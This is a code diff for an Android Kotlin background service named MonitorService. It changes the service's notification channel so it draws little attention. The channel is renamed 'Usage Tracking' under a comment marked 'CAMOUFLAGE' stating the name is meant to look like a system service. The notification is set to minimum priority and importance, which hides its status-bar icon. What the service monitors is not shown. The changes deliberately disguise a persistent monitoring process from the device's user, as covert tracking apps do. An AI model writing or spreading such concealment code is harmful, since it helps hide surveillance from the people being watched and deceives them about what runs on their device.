@@ -20,7 +20,8 @@ class MonitorService : Service() {
 
     private val job = SupervisorJob()
     private val scope = CoroutineScope(Dispatchers.IO + job)
-    private val CHANNEL_ID = "persistent_stats"
+    // Changed ID to force new settings on update
+    private val CHANNEL_ID = "background_service"
     private val NOTIF_ID = 777
     // OPTIMIZATION: Overlay removed to prevent CPU wake-locks and heat.
 
@@ -145,13 +146,17 @@ class MonitorService : Service() {
             .setOnlyAlertOnce(true)
             .setShowWhen(false)
             .setContentIntent(null)
+            // PRIORITY_MIN pushes it to the bottom and hides icon from status bar
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
     }
 
     private fun createChannel() {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
             val mgr = getSystemService(NotificationManager::class.java)
-            val chan = NotificationChannel(CHANNEL_ID, "Daily Monitor", NotificationManager.IMPORTANCE_LOW)
+            // CAMOUFLAGE: Channel name looks like a system service
+            // IMPORTANCE_MIN = Silent, Minimized, No Status Bar Icon
+            val chan = NotificationChannel(CHANNEL_ID, "Usage Tracking", NotificationManager.IMPORTANCE_MIN)
             chan.setShowBadge(false)
             mgr.createNotificationChannel(chan)
         }
